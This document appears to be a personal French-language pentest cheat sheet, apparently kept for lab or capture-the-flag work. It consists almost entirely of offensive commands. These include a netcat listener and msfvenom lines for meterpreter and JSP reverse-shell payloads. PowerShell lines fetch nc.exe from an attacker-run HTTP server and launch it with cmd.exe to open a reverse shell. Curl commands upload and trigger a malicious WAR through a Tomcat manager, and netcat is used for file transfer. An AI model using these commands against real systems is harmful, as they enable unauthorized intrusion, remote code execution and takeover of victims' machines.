##### Ecouter sur un port
$ nc -lvnp {port}

##### Pour les reverses shell (en normal ou meterpreter)
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
$ msfvenom -p {payload} lhost={local_ip_address} lport={local_port} -f {format} -o {nom}
  exemple payload : linux/x86/meterpreter/reverse_tcp
                 android/meterpreter/reverse_tcp
  exemple format : raw / elf / war

###### Transfert de fichier 
#### Sur le linux attaquant voulant partager nc.exe
cd ~/Desktop/ # On va là où les fichiers que l'on veut partager sont
python3 -m http.server {port_local}

#### Sur le client windows (pour linux jouer avec wget ou curl)
powershell -c (New-Object Net.WebClient).DownloadFile('http://{adresse_ip}:{port_local}/nc.exe', 'nc.exe')
powershell.exe Start-Process .\nc.exe -ArgumentList '{LHOST} {LPORT} -e cmd.exe'

#### Avec curl sur un site web comme tomcat
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war > shell.war
$ curl -u 'username':'password' -T shell.war 'http://{target}/manager/text/deploy?path=/mon_shell'
$ curl -u 'username':'password' http://{target}/mon_shell/

#### avec Netcat
# sur le client (qui va recevoir)
$ nc -l -p {port} -q 1 > something.zip < /dev/null
# sur le serveur (celui qui envoi)
$ cat something.zip | netcat {ip_client} {port_client}

#### Penser aux CVE
#### Recherche de vuln
$ searchsploit {keyword}

#### Forward de port
Pour le forward de port remote, local et dynamique, voir le document word.
